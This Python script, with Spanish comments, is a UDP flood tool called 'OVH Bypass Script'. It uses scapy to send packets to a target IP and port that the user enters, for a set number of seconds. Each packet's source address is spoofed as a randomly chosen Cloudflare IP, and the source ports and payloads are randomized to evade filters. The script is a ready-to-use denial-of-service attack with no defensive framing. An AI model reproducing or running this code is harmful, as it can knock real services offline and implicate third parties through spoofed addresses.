from scapy.all import *
import random
import time

# Lista de IPs de Cloudflare (puedes agregar más si lo deseas)
cloudflare_ips = [
    "173.245.49.100",
    "173.245.48.100",
    "188.114.97.1",
    "188.114.96.1",
    "190.93.247.1",
    "190.93.246.1",
    "197.234.240.1",
    "198.41.200.1",
    "162.158.132.1",
    "104.16.0.1"
]

def main():
    print("=== OVH Bypass Script ===")
    dst_ip = input("Ingresa la IP de destino: ").strip()
    dst_port = int(input("Ingresa el puerto de destino: ").strip())
    duration = int(input("Ingresa el tiempo en segundos para enviar paquetes: ").strip())

    end_time = time.time() + duration
    sent_packets = 0

    print(f"\nEnviando paquetes UDP a {dst_ip}:{dst_port} usando IPs de Cloudflare por {duration} segundos...\n")
    try:
        while time.time() < end_time:
            # Seleccionar una IP de Cloudflare aleatoria para el origen
            src_ip = random.choice(cloudflare_ips)
            # Puerto de origen aleatorio para mayor "bypass"
            src_port = random.randint(1024, 65535)
            # Cargar payload aleatorio para evadir filtros simples
            payload = f"Bypass-{random.randint(0,999999)}"

            packet = IP(src=src_ip, dst=dst_ip)/UDP(dport=dst_port, sport=src_port)/Raw(load=payload)
            send(packet, verbose=0)
            sent_packets += 1

        print(f"\nFinalizado. Paquetes enviados: {sent_packets}")
    except KeyboardInterrupt:
        print(f"\nInterrumpido por el usuario. Paquetes enviados: {sent_packets}")

if __name__ == "__main__":
    main()
